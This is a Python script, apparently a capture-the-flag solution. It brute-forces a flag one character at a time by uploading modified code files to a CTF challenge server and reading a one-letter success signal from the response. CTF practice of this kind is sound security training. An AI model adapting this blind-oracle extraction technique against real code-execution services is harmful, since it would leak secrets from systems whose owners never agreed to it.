import requests
from bs4 import BeautifulSoup

session = requests.session()

url = 'https://pyscript.ctf.zoolab.org/'

wordlist = ['}','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z','0','1','2','3','4','5','6','7','8','9','_']
cnt=5
while(True):
	for i in wordlist:
		fin = open("sol", "rt")
		fout = open("search", "wt")
		for line in fin:
			fout.write(line.replace('if(ff[]==):', 'if(ff['+str(cnt)+']=='+"'"+i+"'):"))
		fin.close()
		fout.close()
		with open('search', 'r') as f:
			response = session.post(url, files = {'file': f})

		soup = BeautifulSoup(response.text, "html.parser")
		if(soup.text[0]=='F'):
			flag = i
			print(flag,end='')
			cnt+=1
			break
	if(flag=='}'):
		break
